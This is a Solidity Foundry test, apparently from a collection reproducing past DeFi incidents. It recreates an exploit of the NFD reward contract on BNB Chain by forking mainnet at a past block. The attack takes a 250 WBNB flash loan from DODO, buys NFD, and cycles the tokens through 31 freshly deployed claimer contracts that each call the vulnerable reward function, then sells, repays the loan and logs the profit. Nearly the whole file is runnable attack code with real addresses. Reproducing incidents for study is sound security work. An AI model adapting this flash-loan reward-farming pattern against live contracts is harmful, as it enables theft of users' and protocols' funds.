pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import "../interface.sol";

interface IStakedV3 {
    function Invest(
        uint256 id,
        uint256 amount,
        uint256 quoteAmount,
        uint256 investType,
        uint256 cycle,
        uint256 deadline
    ) external payable;
}
address constant vulnContract = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;

contract Attacker is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IPancakeRouter constant PancakeRouter =
        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
    address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    function setUp() public {
        cheat.createSelectFork("bsc", 21_140_434);
        console.log("--------------Tx2 Reproduce---------------");
        cheat.label(address(PancakeRouter), "PancakeRouter");
        cheat.label(vulnContract, "vulnContractName");
        cheat.label(wbnb, "WBNB");
        cheat.label(dodo, "DODO");
        cheat.label(usdt, "USDT");
        cheat.label(nfd, "NFD");
    }

    function testExploit() public {
        console.log("----------Attacking --------------");
        bytes memory data = abi.encode(250 * 1e18);
        DVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);
    }

    function DVMFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        require(
            WBNB(wbnb).balanceOf(address(this)) == quoteAmount,
            "Insufficient balance"
        );
        require(quoteAmount == 250 * 1e18, "Invalid WBNB amount");
        console.log("Swap 250 WBNB to NFD...");

        address[] memory path = new address[](3);
        path[0] = wbnb;
        path[1] = usdt;
        path[2] = nfd;
        IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            quoteAmount,
            0,
            path,
            address(this),
            block.timestamp + 120
        );

        emit log_named_decimal_uint(
            "[*] NFD balance before attack",
            IERC20(nfd).balanceOf(address(this)),
            18
        );

        for (uint256 i = 0; i <= 30; i++) {
            Claimer claimer = new Claimer();
            IERC20(nfd).transfer(
                address(claimer),
                IERC20(nfd).balanceOf(address(this))
            );
            claimer.claim();
        }

        console.log("--------------Swap nfd to wbnb----------------");
        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));

        IERC20(nfd).approve(address(PancakeRouter), nfdBalance);
        path[0] = nfd;
        path[1] = usdt;
        path[2] = wbnb;
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            nfdBalance,
            0,
            path,
            address(this),
            block.timestamp + 120
        );

        console.log("----------Repay flashloan------------");
        WBNB(wbnb).transfer(address(dodo), 250 * 1e18);
        uint256 balance = IERC20(wbnb).balanceOf(address(this));
        console.log("-------Attrack reward is ", balance);
    }
}

contract Claimer {
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    function claim() public {
        vulnContract.call(abi.encode(bytes4(0x6811e3b9)));
        uint256 reward = IERC20(nfd).balanceOf(address(this));
        bool success = IERC20(nfd).transfer(msg.sender, reward);
        require(success, "failed");
    }
}
